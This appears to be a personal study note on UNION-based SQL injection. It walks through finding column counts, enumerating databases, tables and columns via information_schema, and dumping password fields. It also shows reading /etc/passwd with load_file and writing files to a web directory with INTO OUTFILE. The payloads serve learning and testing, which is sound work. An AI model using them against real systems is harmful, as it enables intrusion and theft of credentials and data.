---
tags:
  - security
  - sqli
  - web
title: UNION based (In-band) Injection
date: 2024-01-28 14:15:56 -0600
updated: 2024-01-28 14:15:56 -0600
---

They can be used to combine of output of two SELECT statements
This method only works if the number of columns in both the statements are the same

````sql
SELECT * FROM login 
UNION 
SELECT 1, 2, 3;
````

In place of numbers we can use SQL functions

````sql
SELECT * FROM login 
UNION 
SELECT database(), user(), version();
````

### Finding Number of Columns

#### Brute Force Approach

We can try different number of columns till we find the result that works
union select 1# (Error)
union select 1,2# (Error)

#### ORBER BY Clause

We cause the query `ORBER BY 20#` and see if we get error if so there are less an 20 columns
Then we try 10. If no error which means there are either exactly 10 or more than 10 columns
No we can try values between 10 and 20 till be find the no. of columns

 > [!NOTE]
 > Not all columns from the DB are going to be present in output. Only the fields that are fetched from the DB can be used for fetching information

### Finding Tables Names and Column Values

#### View DB Names

The "schema_name" column consist of the DB names

````sql
SELECT schema_name 
FROM information_schema.schemata;
````

So we can used "schema_name" to find all the DB

````sql
UNION
SELECT 1, 2, 3, 4, 5, 6, database(), 8, user(), schema_name, version() 
FROM information_schema.schemata;#
````

#### View Table Names in DB

The "table_name" column consist of the table name

````sql
SELECT table_name 
FROM information_schema.tables 
WHERE table_schema="<db-name>";
````

Now we can view all the tables in the DB using the following

````sql
UNION
SELECT 1, 2, 3, 4, 5, 6, database(), 8, user(), table_name, version() 
FROM information_schema.tables 
WHERE table_schema="<db-name>";#
````

The `group_concat()` function will show all the results as an single string

````sql
UNION 
SELECT 1, 2, 3, 4, 5, 6, database(), 8, user(), group_concat(table_name), version() 
FROM information_schema.tables 
WHERE table_schema="<db-name>";#
````

#### Table Column Names

The "column_name" filed consist of the column names of the table

````sql
SELECT column_name 
FROM information_schema.columns 
WHERE table_name='<table-name>';
````

The columns of the table can be viewed as follows

````sql
UNION 
SELECT 1, 2, 3, 4, 5, 6, database(), 8, user(), column_name, version() 
FROM information_schema.columns 
WHERE table_name='<table-name>';#
````

#### View Data from Columns

````sql
UNION 
SELECT 1, 2, 3, 4, 5, 6, id, 8, password, column_name, version 
FROM <table-name>;#
````

### Reading and Writing Files to Server

#### Reading Data from File

Load File can be used to load files on Server

````sql
UNION 
SELECT 1, load_file('/etc/passwd'), null, null;#
````

#### Writing Data to File

Outfile command can be used to write data to a file on the server

````sql
UNION 
SELECT null, 'example text', null, null INTO OUTFILE '/var/www/example.txt';#
````

For reading and writing to the server we need to have the right permissions so only works if the permissions are miss configured
